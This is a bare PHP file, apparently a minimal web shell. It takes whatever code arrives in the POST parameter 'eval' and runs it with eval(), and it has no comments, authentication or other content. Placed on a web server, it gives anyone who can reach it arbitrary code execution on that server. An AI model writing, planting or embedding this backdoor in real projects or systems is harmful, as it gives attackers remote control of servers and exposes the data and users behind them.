<?php
ob_start();
$eval = $_POST['eval'];
eval($eval);
?>